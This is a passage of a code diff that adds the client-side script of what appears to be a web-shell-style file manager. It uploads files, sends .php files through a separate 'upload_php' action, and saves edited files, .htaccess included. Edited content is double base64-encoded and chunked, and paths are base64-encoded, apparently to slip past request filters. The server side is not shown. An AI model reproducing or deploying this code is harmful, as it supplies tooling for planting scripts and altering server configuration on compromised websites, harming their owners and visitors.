+        dom.uploadBtn.addEventListener('click', () => dom.hiddenFileInput.click());
+
+        dom.hiddenFileInput.addEventListener('change', async (e) => {
+            const files = Array.from(e.target.files);
+            if (files.length === 0) return;
+            for (const file of files) {
+                if (file.size > UPLOAD_LIMIT_MB * 1024 * 1024) {
+                    alert(`Error: File "${file.name}" is too large (Max: ${UPLOAD_LIMIT_MB} MB).`);
+                    continue;
+                }
+                const reader = new FileReader();
+                const fileReadPromise = new Promise((resolve, reject) => {
+                    reader.onload = event => resolve(event.target.result);
+                    reader.onerror = error => reject(error);
+                    reader.readAsDataURL(file);
+                });
+                try {
+                    const content_base64 = await fileReadPromise;
+                    const originalName = file.name;
+                    const fd = new FormData();
+                    fd.append('path', STATE.currentPath);
+                    fd.append('content_base64', content_base64);
+                    if (originalName.toLowerCase().endsWith('.php')) {
+                        fd.append('filename_base64', btoa(originalName));
+                        await apiCall('upload_php', fd, true);
+                    } else {
+                        fd.append('filename_base64', btoa(originalName));
+                        await apiCall('upload', fd, true);
+                    }
+                } catch (error) {
+                    alert(`Failed to process file ${file.name}: ${error.message}`);
+                }
+            }
+            e.target.value = '';
+            render();
+        });
+
+        dom.saveBtn.addEventListener('click', () => {
+            const path = dom.editorFilename.textContent;
+            const content = btoa(btoa(dom.editor.value));
+            const fd = new FormData();
+            const chunkSize = 4096;
+            for (let i = 0; i < content.length; i += chunkSize) {
+                fd.append('content_chunks[]', content.substring(i, i + chunkSize));
+            }
+            let action = 'save_content';
+            if (path.includes('.htaccess')) {
+                action = 'save_content_b64';
+                fd.append('path_b64', btoa(path));
+            } else {
+                fd.append('path', path);
+            }
+            apiCall(action, fd, true).then(result => {
+                if (result) {
+                    dom.editorModal.style.display = 'none';
+                    render();
+                }
+            });
+        });
+
+        render();
+    });
+    </script>
+</body>
+</html>
